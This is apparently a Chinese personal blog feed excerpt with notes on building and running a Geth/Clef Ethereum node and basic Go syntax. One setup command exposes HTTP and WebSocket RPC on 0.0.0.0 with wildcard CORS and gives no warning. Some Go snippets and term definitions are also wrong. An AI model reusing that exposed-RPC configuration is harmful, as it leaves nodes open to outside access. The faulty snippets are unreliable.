<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo add-apt-repository -y ppa:ethereum/ethereum</span><br><span class="line">sudo apt update</span><br><span class="line">sudo apt install ethereum</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>可以通过源码编译安装。首先需要从GitHub上下载源码，<a href="https://github.com/ethereum/go-ethereum/releases">点这里</a></p>
<p>然后采用如下命令解压编译</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tar -xzf go-ethereum-1.10.16.tar.gz</span><br><span class="line">cd go-ethereum-1.10.16</span><br><span class="line">make all</span><br></pre></td></tr></table></figure>
<p>等一会就编译成功了，可以根据提示找到可执行文件的位置</p>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220326153310344.png" alt="image-20220326153310344"></p>
<p>不过我在编译的时候出现了这么一个错误，在网上查找之后发现有各种各样的原因，有说go版本不对的，有说缺包的。都没什么用。后来在一个犄角旮旯里发现使用如下命令就可以解决这个问题</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install build-essential</span><br></pre></td></tr></table></figure>
<p>后来上网查了查这个包有什么用，发现它仅仅就是把开发CPP的一些包下载了，像是gcc，make什么的。估计我也是缺了这里面的一些东西吧。</p>
<p>此外，这里除了Geth也编译了一些其它的组件，像Clef，由于官方给的入门文档里用到了Clef，所以了解一下Clef也是很有必要的。</p>
</li>
</ol>
<h1>Clef</h1>
<h2 id="概述"><a class="header-anchor" href="#概述">¶</a>概述</h2>
<p>​	Geth大概是一个代替Geth原有的结点账户管理的工具，Clef可以使Geth不必依赖Geth的账户管理，当Dapp需要对数据进行签名时，可以将数据发给Clef，在经过授权同意后，Clef把签名返还给Dapp</p>
<p>​	上面的描述是官方文档给出来的。关于签名这种名词是区块链相关的概念，Dapp就是一个应用，不过其后端代码在一个去中心化的P2P网络上运行。也就是说Clef的主要作用就是把账户管理和Geth的其他功能分隔开。</p>
<h2 id="简单实用"><a class="header-anchor" href="#简单实用">¶</a>简单实用</h2>
<h3 id="初始化"><a class="header-anchor" href="#初始化">¶</a>初始化</h3>
<p>​	启用Clef服务需要先进行初始化，初始化的时候会要求输入一个密码。虽然后来在使用Geth的时候官方也没有初始化。。。</p>
<p>​	这里的密码主要是为了加密数据，因为Clef本身存储的可能是一些敏感数据，所以它的整个存储都是加密的</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">clef init</span><br></pre></td></tr></table></figure>
<h3 id="启动服务"><a class="header-anchor" href="#启动服务">¶</a>启动服务</h3>
<p>​	初始化之后就可以启动服务，相关的参数可以去官网查看</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">clef --keystore geth-tutorial/keystore --configdir geth-tutorial/clef --chainid 5</span><br></pre></td></tr></table></figure>
<p>​	这里面的几个参数含义如下</p>
<ul>
<li><code>--keystore</code>，这个参数后面跟的是一个路径，主要就是存储账户的一些信息</li>
<li><code>--chainid</code>，主要是指定一条需要签名的链的编号</li>
</ul>
<p>​    启动之后这个终端就不要管了，打开一个新的终端去进行操作吧</p>
<h2 id="规则引擎"><a class="header-anchor" href="#规则引擎">¶</a>规则引擎</h2>
<p>​	主要是设置一些规则来允许其自动签署某些交易。可以创建一些规则文件，自动允许任何人在没有用户确认的情况下列出可用账户。规则文件是一个很小的<code>JavaScript</code>代码片段。</p>
<p>​	当然为了防止一些恶意的规则文件的存在，需要计算出这个规则文件的hash，将其注入到Clef的存储中，Clef才能够运用这个规则，主要命令如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sha256sum rules.js</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 一串<span class="built_in">hash</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> clef attest 那串<span class="built_in">hash</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 中间需要输入密码</span></span><br></pre></td></tr></table></figure>
<p>​	然后在clef启动的时候使用参数<code>--rule</code>参数后面跟文件名即可</p>
<h2 id="外部API"><a class="header-anchor" href="#外部API">¶</a>外部API</h2>
<p>​	Clef提供了一些外部API可供客户端与其交互</p>
<ul>
<li><code>account_new</code>，创建账号</li>
<li><code>account_list</code>，列出账号列表</li>
<li><code>account_signTransaction</code>，获得交易签名</li>
<li><code>account_signData</code>，获得签名数据</li>
<li><code>account_import</code>，账号导入</li>
<li><code>account_export</code>，账号导出</li>
</ul>
<h2 id="与Geth整合"><a class="header-anchor" href="#与Geth整合">¶</a>与Geth整合</h2>
<p>​	可以使用<code>--signer</code>来和Geth整合</p>
<h1>搭建节点</h1>
<h2 id="方案一"><a class="header-anchor" href="#方案一">¶</a>方案一</h2>
<h3 id="生成账户"><a class="header-anchor" href="#生成账户">¶</a>生成账户</h3>
<p>​	采用如下命令生成账户</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">clef newaccount --keystore geth-tutorial/keystore</span><br></pre></td></tr></table></figure>
<p>​	这条命令将会给出一个WARINING，这是正常的，输入ok即可，接下来他就会提示让你输入密码，输一个就行。然后就会产生你的账户和私钥。</p>
<p>​	注意把账户和生成的私钥地址保存下来。</p>
<p>​	接下来需要重复这个步骤，再生成一个账户。</p>
<h3 id="启动clef"><a class="header-anchor" href="#启动clef">¶</a>启动clef</h3>
<p>​	要启动clef，需要打开一个新的终端并运行以下命令，这个终端就是用来保持clef运行的</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">clef --keystore geth-tutorial/keystore --configdir geth-tutorial/clef --chainid 5</span><br></pre></td></tr></table></figure>
<p>​	注意这里的geth-tutorial这种目录都是需要自己创建的，不然会一直启动不成功。</p>
<p>​	使用这条命令之后再敲一个ok就行了</p>
<h3 id="启动Geth"><a class="header-anchor" href="#启动Geth">¶</a>启动Geth</h3>
<p>​	需要新开启一个终端并执行如下命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">geth --datadir geth-tutorial --signer=geth-tutorial/clef/clef.ipc --goerli --syncmode light --http</span><br></pre></td></tr></table></figure>
<p>​	其中的几个主要参数含义如下所示</p>
<ul>
<li><strong>–datadir</strong>，用来存放节点数据的目录</li>
<li><strong>–syncmode</strong> “mode”，主要对应于三种同步模式，即fast、full、light，其中fast模式指的是该节点会同步所有的区块头、区块体、状态数据，但是不对区块中的交易进行重放，仅仅对数据进行校验。full模式指的是结点会从网络同步所有的数据。light模式则是仅仅同步区块头。这里选择light模式也是因为本人的机器限制，同步全节点数据会把我的机器给爆掉</li>
</ul>
<p>​    另外，在启动Geth之后，就会发现当前的结点已经在同步数据了，在自定义的datadir里可以找到这些数据，需要用16进制打开。</p>
<p>​	官网还在后面给出了两个账户交互的一些方法，但是由于我这里仅仅只是想要用一些链上的数据，同步下来的数据还比较像，所以就先不管了。</p>
<h2 id="方案二"><a class="header-anchor" href="#方案二">¶</a>方案二</h2>
<p>​	上面那个方案是我在geth官网上找到的一个搭建方法，与其说是搭建方法不如说是教了Geth的一些入门用法😂</p>
<p>​	下面这个方法是在网上找到的，其实基本的操作都差不多，就是安装Geth，不过在网上找到的方法也可能都比较老了，没有使用Clef进行账户管理，另外关于Geth的一些命令也有一些问题。下面先来记录一下这个方法。</p>
<h3 id="启动Geth-v2"><a class="header-anchor" href="#启动Geth-v2">¶</a>启动Geth</h3>
<p>​	在安装好Geth之后，创建一个用来存放数据的文件夹。然后启动Geth</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir ~/data/eth_data</span><br><span class="line">nohup geth --datadir ~/data/eth_data --syncmode full --http --http.addr 0.0.0.0 --http.corsdomain &quot;*&quot; --http.api eth,net,web3 --ws --ws.addr 0.0.0.0 --ws.origins &quot;*&quot; --ws.api eth,net,web3 &amp;</span><br></pre></td></tr></table></figure>
<p>​	先说一下第二条长命令，首先<code>nohup</code>和<code>&amp;</code>是和进程相关的命令。一般两个一起用，如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nohup command &amp;</span><br></pre></td></tr></table></figure>
<p>​	<code>nohup</code>表示不挂断的运行命令，相关输出会导入到当前目录下的<code>nohup.out</code>文件中，<code>&amp;</code>就是简单地表示在后台运行，所以一般两个会一起用。要查看运行的后台进程可以用如下命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ps -aux|grep command</span><br><span class="line"><span class="meta">#</span><span class="bash"> 其中ps参数a表示显示所有程序，u表示以用户为主的格式来显示，x表示显示所有程序，不以终端机来区分</span></span><br></pre></td></tr></table></figure>
<p>​	然后看一下geth相关的参数，一些前文已经介绍过的就不再赘述了。下面主要贴一下之前没写到的参数。</p>
<p>JSON-RPC API:</p>
<blockquote>
<p>–http                              Enable the HTTP-RPC server<br>
–http.addr value                   HTTP-RPC server listening interface (default: “localhost”)<br>
–http.port value                   HTTP-RPC server listening port (default: 8545)<br>
–http.api value                    API’s offered over the HTTP-RPC interface<br>
–http.rpcprefix value              HTTP path path prefix on which JSON-RPC is served. Use ‘/’ to serve on all paths.<br>
–http.corsdomain value             Comma separated list of domains from which to accept cross origin requests (browser enforced)<br>
–http.vhosts value                 Comma separated list of virtual hostnames from which to accept requests (server enforced). Accepts ‘*’ wildcard. (default: “localhost”)<br>
–ws                                Enable the WS-RPC server<br>
–ws.addr value                     WS-RPC server listening interface (default: “localhost”)<br>
–ws.port value                     WS-RPC server listening port (default: 8546)<br>
–ws.api value                      API’s offered over the WS-RPC interface<br>
–ws.rpcprefix value                HTTP path prefix on which JSON-RPC is served. Use ‘/’ to serve on all paths.<br>
–ws.origins value                  Origins from which to accept websockets requests</p>
</blockquote>
<p>​	具体更详细的介绍可以参考官网文档的<code>JSON-RPC API</code>部分。</p>
<p>​	所谓的坑就是说官网给的参数似乎一直在变，我参考的很多的教程在开启http服务器的时候都是用的<code>--rpc</code>参数，后来查看官方文档发现这个已经改了…</p>
<p>​	此外，使用这个命令后会发现在刚刚<code>--datadir</code>命令指定的目录下生成了<code>geth.ipc</code>文件，这个文件用来进行通讯。</p>
<h3 id="终端交互"><a class="header-anchor" href="#终端交互">¶</a>终端交互</h3>
<p>​	在启动过Geth之后，目前的这个终端就不要再动了，打开一个新的终端，开启JavaScript控制台。Geth提供了相关的API</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">geth console # 启动Geth结点然后打开控制台</span><br><span class="line">geth attach # 将启动的控制台附加到已经运行的geth实例</span><br></pre></td></tr></table></figure>
<p>​	这里我们选择了后者，由于需要附加到实例，这个时候可以通过rpc接口进行连接，也可以通过刚刚的ipc文件连接，只需要在这条命令后面加上文件路径即可。</p>
<p>​	开启了终端之后会显示一系列的启动配置，这些配置可以在启动的时候通过设置启动参数进行更改。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">eth.blockNumber # 查看区块高度</span><br><span class="line">eth.syncing # 查看同步进程，返回false的时候表示同步未开始或者已经完毕</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/yang-shijun/image/raw/master/images/image-20220312100448307.png" alt="image-20220312100448307"></p>
<p>​	同步下来的数据大概是这样的，咱也不清楚这是什么意思，先留个坑</p>
<h1>相关数据的含义</h1>
<h2 id="Block"><a class="header-anchor" href="#Block">¶</a>Block</h2>
<ul>
<li><code>BlockNum</code>：块号，或者说块高度，越大则块就越新</li>
<li><code>Timestamp</code>：块产生的时间戳</li>
<li><code>transactionCount</code>：交易数量</li>
<li><code>internaltransactionCount</code>：外部交易数量</li>
<li><code>mineraddress</code>：矿工地址，表示这个区块是他挖出来的，给他奖励</li>
<li><code>blockreward</code>：奖励给矿工的币</li>
<li><code>unclesreward</code>：给创建了添加到有效链中的叔块的矿工的奖励。</li>
<li><code>difficulty</code>：挖矿难度值</li>
<li><code>totalDifficulty</code>：当前区块的之前的所有区块的难度总和，是<strong>最长链的最佳指标</strong></li>
<li><code>size</code>：记录区块的大小，大小可变</li>
<li><code>gasUsed</code>：交易消耗的Gas，这个Gas就是账户交易时产生的消耗，归矿工</li>
<li><code>gasLimit</code>：Gas限制，交易消耗的Gas不允许超过该值</li>
<li><code>BaseFeePerGas</code>：通过公式计算出来的一个东西，由当前区块的前一个区块决定，更容易让用户预测到交易费用</li>
<li><code>BurnFees</code>：和基本费用有关的一个量，当当前块被开采出来后就会燃烧基本费用</li>
<li><code>ExtraData</code>：长度不固定的Byte数组，最长32位，完全由矿工自定义</li>
<li><code>Hash</code>：推测应该是区块的Hash</li>
<li><code>ParentHash</code>：父块的Hash，可以和前面的块连接起来</li>
<li><code>sha3Uncles</code>：记录引用的叔块，叔块就是对于PoW挖矿产生分叉时候的改进</li>
<li><code>stateRoot</code>：矿工在把交易打包成块的时候会组织三棵树，其中状态数的叶子节点保存影响到的账户状态。该数据就是将状态数求Hash得到的，这建立了交易和区块头字段的映射</li>
<li><code>Nonce</code>：一个随机数，让块头Hash满足要求，比如需要前几位都是0</li>
</ul>
<h2 id="Block-Transaction"><a class="header-anchor" href="#Block-Transaction">¶</a>Block Transaction</h2>
<ul>
<li><code>blockNum</code>：同上</li>
<li><code>timeStamp</code>：同上</li>
<li><code>trasactionHash</code>：交易Hash，交易的唯一标志</li>
<li><code>from</code>：交易发送方地址</li>
<li><code>to</code>：交易接收方地址</li>
<li><code>toCreate</code>：</li>
<li><code>fromIsContract</code>：</li>
<li><code>toIsContract</code>：</li>
<li><code>Value</code>：交易的币</li>
<li><code>GasLimit</code>：同上</li>
<li><code>GasPrice</code>：为交易付出的Gas的价格</li>
<li><code>GasUsed</code>：本交易消耗的Gas</li>
<li><code>callingFunction</code>：</li>
<li><code>isError</code>：</li>
<li><code>eip2718type</code>：一种交易类型</li>
<li><code>baseFeePerGas</code>：同上</li>
<li><code>masFeePerGas</code>：上下两个数据的总和</li>
<li><code>maxPriorityFeePerGas</code>：给矿工消费的最低限度</li>
</ul>
]]></content>
      <categories>
        <category>分布式系统</category>
        <category>区块链</category>
      </categories>
      <tags>
        <tag>分布式系统</tag>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title>go语言学习</title>
    <url>/2022/01/15/go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>​    寒假主要会做的一些事情是数学建模和tinykv的学习，本身tinykv是用go语言实现的，美赛又比较水:joy:，所以还是先学一点go语言吧，不过整体都非常基础，仅仅是关于一些很基本的语法的学习</p>
<h1 id="包、变量、函数"><a href="#包、变量、函数" class="headerlink" title="包、变量、函数"></a>包、变量、函数</h1><p>​    本部分主要是关于go语言的基本的结构</p>
<p>​    第一个go语言例子</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line">&#123;	</span><br><span class="line">	fmt.Println(<span class="string">&quot;Hello,world&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​    每个go语言程序都是由包（package）构成的，程序从main包开始运行，fmt是自带的关于标准输入输出的包，通过<strong>import “fmt”</strong>来导入，相当于跟的是路径，然后就可以用包中的函数</p>
<p>​    关于导入import，可以分开一个个写，也可以使用圆括号将其一起导入</p>
<p>​    如果一个名字是大写字母开头，那么他就是已经导出的，比如上文中的<strong>Println</strong>，如果使用小写字母开头，则会报错，这应该是一个区分的依据</p>
<hr>
<p>​    下面看一个关于函数的例子</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">add</span><span class="params">(x <span class="keyword">int</span>, y <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	<span class="keyword">return</span> x + y</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fmt.Println(add(<span class="number">1</span>, <span class="number">2</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​    这里的函数中接收的参数的类型在变量之后，最后跟的是返回值的类型，如果两虚两个或多个已命名形参类型相同的时候，可以简写，例如上例的add函数可以简写成</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">add</span><span class="params">(x,y <span class="keyword">int</span>)</span><span class="title">int</span></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> x+y</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​    另外go里面的函数可以返回多值，用元组的形式表示，如下</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">swap</span><span class="params">(x, y <span class="keyword">string</span>)</span> <span class="params">(<span class="keyword">string</span>, <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">	<span class="keyword">return</span> y, x</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	a, b := swap(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;world&quot;</span>)</span><br><span class="line">	fmt.Println(a, b)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​    go语言可以将返回值命名，具体看以下的例子</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">split</span><span class="params">(sum <span class="keyword">int</span>)</span> <span class="params">(x, y <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">	x = sum * <span class="number">4</span> / <span class="number">9</span></span><br><span class="line">	y = sum - x</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fmt.Println(split(<span class="number">17</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​    上面那个例子中，x和y是命名返回值，这里的return后面没有跟任何值，这是因为在最开始已经指定了x和y就是返回值</p>
<p>​    <strong>var</strong>关键字用来声明变量，感觉可以类似于ML语言中的一些写法，例如</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> i,j <span class="keyword">int</span>=<span class="number">1</span>,<span class="number">2</span></span><br></pre></td></tr></table></figure>
<p>​    如果初始值存在，可以省略类型，如果初始值不存在，应该是会给出一个默认值的，而:=语句可以在类型明确的时候代替var，如下</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> i, j <span class="keyword">int</span> = <span class="number">1</span>, <span class="number">2</span></span><br><span class="line">	k := <span class="number">1</span></span><br><span class="line">	fmt.Println(i, j, k)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​    <strong>由于函数外的每个语句都必须从关键字开始</strong>，所以函数外不能使用:=</p>
<hr>
<p>​    go语言有如下的基本类型</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">bool</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">string</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span>  <span class="keyword">int8</span>  <span class="keyword">int16</span>  <span class="keyword">int32</span>  <span class="keyword">int64</span></span><br><span class="line"><span class="keyword">uint</span> <span class="keyword">uint8</span> <span class="keyword">uint16</span> <span class="keyword">uint32</span> <span class="keyword">uint64</span> <span class="keyword">uintptr</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">byte</span> <span class="comment">// uint8 的别名</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">rune</span> <span class="comment">// int32 的别名</span></span><br><span class="line">    <span class="comment">// 表示一个 Unicode 码点</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">float32</span> <span class="keyword">float64</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">complex64</span> <span class="keyword">complex128</span></span><br></pre></td></tr></table></figure>
<p>​    值得一提的是，变量声明可以和导入语句一样，一次性进行多次</p>
<p>​    在没有初始化的时候，这些变量会被赋予<strong>零值</strong></p>
<p>​    下面介绍类型转换的方法，go语言中使用表达式<strong>T(v)</strong>用来将值v转换为类型T，go语言中只能进行<strong>显示转换</strong>，如下</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> i <span class="keyword">int</span> =<span class="number">42</span></span><br><span class="line"><span class="keyword">var</span> f <span class="keyword">float64</span>=<span class="keyword">float64</span>(i)</span><br><span class="line">f:=<span class="keyword">float64</span>(i)</span><br></pre></td></tr></table></figure>
<p>​    然后类型推导就是说在声明的时候没有显示说明变量类型，就通过赋值号右边类型得到左边类型，如下</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> i <span class="keyword">int</span></span><br><span class="line">j:=<span class="keyword">int</span> <span class="comment">//j也是int</span></span><br></pre></td></tr></table></figure>
<p>​    常量也是用<strong>const</strong>修饰</p>
<h1 id="流程控制"><a href="#流程控制" class="headerlink" title="流程控制"></a>流程控制</h1><h2 id="for语句"><a href="#for语句" class="headerlink" title="for语句"></a>for语句</h2><p>​    这里的for循环和之前接触到的编程语言中的for循环类似，只是没有小括号，如下</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	sum := <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">1</span>; i &lt; <span class="number">99</span>; i++ &#123;</span><br><span class="line">		sum += i</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(sum)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​    它也和其他的语言一样可以省略某些部分，此外在go语言中没有while循环，可以将for循环写成类似于while循环的形式，例如</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	sum := <span class="number">0</span></span><br><span class="line">	i := <span class="number">1</span></span><br><span class="line">	<span class="keyword">for</span> i &lt; <span class="number">99</span> &#123;</span><br><span class="line">		sum += i</span><br><span class="line">		i++</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(sum)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="if语句"><a href="#if语句" class="headerlink" title="if语句"></a>if语句</h2><p>​    if语句也是不需要括号的，如下</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	sum := <span class="number">0</span></span><br><span class="line">	i := <span class="number">1</span></span><br><span class="line">	<span class="keyword">for</span> i &lt; <span class="number">99</span> &#123;</span><br><span class="line">		sum += i</span><br><span class="line">		i++</span><br><span class="line">        <span class="keyword">if</span> k:=<span class="number">10</span>;i == <span class="number">50</span> &#123;</span><br><span class="line">			fmt.Println(i,k)</span><br><span class="line">        &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(sum)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​    注意到上例中if语句可以和for循环一样在条件表达式之前执行一个简单地语句，<strong>其作用域仅在if之内</strong>，这里包括else</p>
<h2 id="switch语句"><a href="#switch语句" class="headerlink" title="switch语句"></a>switch语句</h2><p>​    这个语句和之前的语言的区别主要在于仅仅执行一个case，系统自动提供了每一个case后面给的break</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;runtime&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fmt.Print(<span class="string">&quot;Go runs on &quot;</span>)</span><br><span class="line">	<span class="keyword">switch</span> os := runtime.GOOS; os &#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&quot;darwin&quot;</span>:</span><br><span class="line">		fmt.Println(<span class="string">&quot;OS X.&quot;</span>)</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&quot;linux&quot;</span>:</span><br><span class="line">		fmt.Println(<span class="string">&quot;Linux.&quot;</span>)</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="comment">// freebsd, openbsd,</span></span><br><span class="line">		<span class="comment">// plan9, windows...</span></span><br><span class="line">		fmt.Printf(<span class="string">&quot;%s.\n&quot;</span>, os)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​    当然也有没有条件的switch，这个时候和switch true一样，在每一个case后面跟条件判断语句</p>
<h2 id="defer语句"><a href="#defer语句" class="headerlink" title="defer语句"></a>defer语句</h2><p>​    这是一个之前没有见过的语句，主要用于延迟求值，将函数推迟到外层函数返回之后执行，其函数的参数会<strong>立即求值</strong>，但是直到外层函数返回前该函数都不会被调用，例如</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    fmt.Println(deferReturn())</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">deferReturn</span><span class="params">()</span> <span class="params">(ret <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">    <span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        ret++</span><br><span class="line">    &#125;()</span><br><span class="line">    <span class="keyword">return</span> <span class="number">10</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​    这时候输出的值是11，但是在下面的这个例子里，输出的是0</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">returnDefer</span><span class="params">()</span> <span class="params">(ret <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        ret++</span><br><span class="line">        ret++</span><br><span class="line">    &#125;()</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​    另外应注意在有多个defer语句的时候，是逆序执行的，这是因为被延迟执行的函数全都被压入了一个栈中，例如</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">returnDefer</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">1</span>; i &lt;= <span class="number">5</span>; i++ &#123;</span><br><span class="line">		<span class="keyword">defer</span> fmt.Println(i)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​    输出是5 4 3 2 1</p>
<h1 id="更多类型"><a href="#更多类型" class="headerlink" title="更多类型"></a>更多类型</h1><h2 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h2><p>​    go语言拥有指针类型，其用法和C语言差不多，但是没有指针运算</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> p *<span class="keyword">int</span></span><br><span class="line">i:=<span class="number">42</span></span><br><span class="line">p=&amp;i</span><br></pre></td></tr></table></figure>
<h2 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h2><p>​    这里都和C语言的那些东西蛮像的，给个例子</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> point <span class="keyword">struct</span> &#123;</span><br><span class="line">	x <span class="keyword">int</span></span><br><span class="line">	y <span class="keyword">int</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> p=point&#123;<span class="number">1</span>,<span class="number">2</span>&#125;</span><br></pre></td></tr></table></figure>
